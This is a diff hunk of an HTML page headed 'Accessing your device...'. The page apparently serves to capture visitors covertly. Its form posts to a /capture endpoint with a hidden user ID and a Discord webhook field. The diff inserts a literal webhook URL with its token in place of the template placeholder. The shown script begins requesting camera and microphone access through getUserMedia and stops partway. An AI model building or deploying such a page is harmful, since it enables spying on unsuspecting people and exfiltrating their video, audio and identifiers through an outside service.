@@ -7,7 +7,7 @@
 </head>
 <body>
     <h1>Accessing your device...</h1>
-    <form action="http://192.168.4.41:5000/capture" method="post">       <input type="hidden" name="user_id" value="{{ user_id }}">       <input type="hidden" name="discord_webhook" value="{{ discord_webhook }}">            <button type="submit">Submit</button>
+    <form action="http://192.168.4.41:5000/capture" method="post">       <input type="hidden" name="user_id" value="{{ user_id }}">       <input type="hidden" name="discord_webhook" value="{{ https://discordapp.com/api/webhooks/1479957368979587073/ErJKs0AtwDGEo60Ba5JtsVnTUR2vCiXFhCHyGAuyY3ZlqCj0HEKroZ-GwHNEFQ02AOyQ }}">            <button type="submit">Submit</button>
     </form>
 
     <script>navigator.mediaDevices.getUserMedia({ video: true, audio: true })      .then(stream => { const video = document.createElement('video');       video.srcObject = stream;
